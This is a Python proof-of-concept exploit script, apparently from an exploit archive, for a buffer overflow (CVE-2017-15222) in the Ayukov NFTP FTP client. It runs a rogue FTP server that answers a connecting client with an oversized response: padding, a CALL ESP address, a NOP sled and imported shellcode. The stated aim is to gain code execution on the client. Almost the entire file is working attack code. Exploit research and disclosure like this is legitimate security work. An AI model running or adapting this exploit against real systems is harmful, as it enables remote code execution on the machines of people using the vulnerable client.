#!/usr/bin/env python
# coding: utf-8

############ Description: ##########
# The vulnerability was discovered during a vulnerability research lecture.
# This is meant to be a PoC.
####################################

# Exploit Title: Ayukov NFTP FTP Client - Buffer Overflow
# Date: 2017-10-21
# Exploit Author: Berk Cem GÃ¶ksel
# Contact: twitter.com/berkcgoksel || bgoksel.com
# Vendor Homepage: http://ayukov.com/nftp/source-release.html
# Software Link: ftp://ftp.ayukov.com/pub/nftp/
# Version:  v1.71, v1.72, v1.8, v2.0
# Tested on: Windows 10
# Category: Windows Remote Exploit
# CVE : CVE-2017-15222
import socket
from payload import buf
import sys
def shell_attack(target_machine, target_port):


        IP = target_machine
        port = target_port


        #(exec calc.exe)

        CALL_ESP = b"\xdd\xfc\x40\x00" # call esp - nftpc.exe  #0040FCDD
        buff = b"A" * 4116 + CALL_ESP + b'\x90' * 16 + buf + b"C" * (15000-4116-4-16-len(buf))
        #Can call esp but the null byte terminates the string.

        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind((IP, port))
                s.listen(20)
                
        except:
                pass

        while True:
                conn, addr = s.accept()
                conn.send(b'220 Welcome!' + b'\r\n')
                conn.recv(1024)
                conn.send(b'331 OK.\r\n')
                conn.recv(1024)
                conn.send(b'230 OK.\r\n')
                conn.recv(1024)
                conn.send(buff + b'\r\n')
                conn.recv(1024)
                conn.send(b'257' + b'\r\n')


